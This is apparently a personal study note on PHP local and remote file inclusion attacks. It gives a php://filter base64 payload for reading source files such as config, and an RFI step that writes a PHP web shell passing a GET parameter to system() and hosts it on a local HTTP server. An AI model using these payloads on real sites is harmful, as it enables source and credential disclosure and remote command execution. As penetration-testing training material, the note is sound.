# PHP Filters

## Input Filters

[PHP Filters](https://www.php.net/manual/en/filters.php) are a type of PHP wrapper, where we can pass different types of input and have it filtered by the filter we specify. To use PHP wrapper streams, we can use the `php://` scheme in our string, and we can access the PHP filter wrapper with `php://filter/`.

There are four different types of filters available for use, which are [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php). You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the `convert.base64-encode` filter, under `Conversion Filters`.

## Fuzzing for PHP Files

The first step would be to fuzz for different available PHP pages with a tool like `ffuf` or `gobuster`.

**Tip:** Unlike normal web application usage, we are `not restricted` to pages with HTTP response code 200, as we have `local file inclusion access`, so we should be scanning for all codes, including `301`, `302` and `403` pages, and we should be able to read their source code as well.

## Source Code Disclosure

Once we have a list of potential PHP files we want to read, we can start disclosing their sources with the `base64` PHP filter.

```
php://filter/read=convert.base64-encode/resource=config
```


# Remote File Inclusion

## Verify RFI

In most languages, including remote URLs is considered as a dangerous practice as it may allow for such vulnerabilities. This is why remote URL inclusion is usually disabled by default. For example, any remote URL inclusion in PHP would require the `allow_url_include` setting to be enabled.

So, a more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to `try and include a URL`, and see if we can get its content. At first, `we should always start by trying to include a local URL (http://127.0.0.1:80/index.php)` to ensure our attempt does not get blocked by a firewall or other security measures. 

![[Pasted image 20260103111943.png]]

## Remote Code Execution with RFI

```bash
$ echo '<?php system("id"); system($_GET[0]); ?>' > shell.php
sudo python3 -m http.server 4444
```

![[Pasted image 20260103112422.png]]

We may also host our script through FTP/SMB protocol